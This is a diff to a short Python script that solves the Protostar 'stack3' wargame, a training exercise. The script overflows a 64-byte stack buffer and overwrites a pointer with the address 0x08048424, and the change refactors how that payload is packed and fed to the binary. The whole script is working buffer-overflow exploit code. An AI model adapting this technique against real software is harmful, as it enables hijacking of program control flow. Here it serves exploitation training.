@@ -1,11 +1,11 @@
 #!/usr/bin/env python2.6
 
-import subprocess
+import struct
 
-p = subprocess.Popen("/opt/protostar/bin/stack3",stdin=subprocess.PIPE)
-
-flag = reversed('\x08\x04\x84\x24')
+flag = struct.pack("I", 0x08048424)
 
 payload = "A" * 64 + "".join(flag)
 
-p.communicate(payload)
+import utils
+
+utils.run_file_with_stdin("/opt/protostar/bin/stack3", payload)
